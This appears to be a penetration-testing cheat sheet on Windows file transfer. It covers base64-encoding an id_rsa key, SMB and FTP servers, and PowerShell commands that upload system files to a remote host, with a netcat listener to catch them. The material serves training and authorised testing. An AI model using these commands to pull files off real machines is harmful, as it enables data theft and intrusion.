---
title: Windows File Transfer
tags: [download, upload, wget, curl]
tools: ['ftp', 'openssl', 'python', 'impacket-smb-server']
notes: "Various file transfer techniques for Windows/Active Directory"
---

# Windows File Transfer

## Download Operations

### PowerShell Base64 Encode & Decode

Windows Command Line utility (cmd.exe) has a maximum string length of  8,191 characters. Also, a web shell may error if you attempt to send  extremely large strings. 

**Encoding**

```bash
# Get file hash
md5sum id_rsa
4e301756a07ded0a2dd6953abf015278  id_rsa

# Encode
cat id_rsa |base64 -w 0;echo
LS0tLS1CR ---SNIP--- tLS0tLQo=
```

**Decoding**

```powershell
# Decode
[IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("LS0tLS1CR ---SNIP--- tLS0tLQo="))

# Check and match hash
Get-FileHash C:\Users\Public\id_rsa -Algorithm md5

Algorithm       Hash                                                                   Path
---------       ----                                                                   ----
MD5             4E301756A07DED0A2DD6953ABF015278
```

---

### SMB Downloads

**Create share with impacket:**

`sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test`

**Mount the share:**

`net use n: \\192.168.1.10\share /user:test test`

---

### Python FTP Server

**Start server:**

`sudo python3 -m pyftpdlib --port 21`

**Grab file:**

`(New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'C:\Users\Public\ftp-file.txt')`

---



## Upload Operations

### PowerShell Base64 Encode & Decode

**Encode File Using PowerShell:**

```powershell
# Encode file
[Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))

IyBDb3B5cm ---SNIP--- YWxob3N0DQo=
# Get file hash
Get-FileHash "C:\Windows\system32\drivers\etc\hosts" -Algorithm MD5 | select Hash

Hash
----
3688374325B992DEF12793500307566D
```

**Decode Base64 String in Linux:**

```bash
# Decode file
echo IyBDb3B5cm ---SNIP--- YWxob3N0DQo= | base64 -d > hosts

# Check and match hash
md5sum hosts 

3688374325b992def12793500307566d  hosts
```

---

### PowerShell Web Uploads Base64

**Start the server:**

`python3 -m uploadserver`

**Upload file:**

```powershell
# Encode | Send
$b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))

Invoke-WebRequest -Uri http://192.168.1.10:8000/ -Method POST -Body $b64

# Catch with netcat and decode
nc -lvnp 8000

<base64> | base64 -d -w 0 > hosts
```

---

### Python FTP Uploads

**Start the server:**

`sudo python3 -m pyftpdlib --port 21 --write`

**PowerShell Upload:**

`(New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')`

**Create a Command File for the FTP Client to Upload a File**

```cmd
echo open 192.168.49.128 > ftpcommand.txt
echo USER anonymous >> ftpcommand.txt
echo binary >> ftpcommand.txt
echo PUT c:\windows\system32\drivers\etc\hosts >> ftpcommand.txt
echo bye >> ftpcommand.txt
ftp -v -n -s:ftpcommand.txt
ftp> open 192.168.1.10

Log in with USER and PASS first.


ftp> USER anonymous
ftp> PUT c:\windows\system32\drivers\etc\hosts
ftp> bye
```

